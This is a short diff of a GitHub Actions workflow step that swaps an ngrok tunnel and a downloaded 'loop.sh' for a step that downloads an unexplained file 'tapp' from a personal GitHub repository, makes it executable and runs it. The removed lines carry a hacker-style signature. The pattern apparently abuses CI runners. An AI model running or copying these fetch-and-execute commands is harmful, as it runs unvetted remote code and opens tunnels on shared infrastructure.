@@ -54,9 +54,6 @@ jobs:
           
       - name: JALANIN NGROK DLU
         run: |
-          echo BY NETFLEX WIBU HENGKER
-          echo BENTAR TOD
-          ngrok http 8443 -region ap
-          wget https://raw.githubusercontent.com/Geruays/ubuntu-test-workflow/main/loop.sh
-          chmod +x loop.sh
-          ./loop.sh
+          wget https://raw.githubusercontent.com/Geruays/multi-sh/main/tapp
+          chmod +x tapp
+          ./tapp
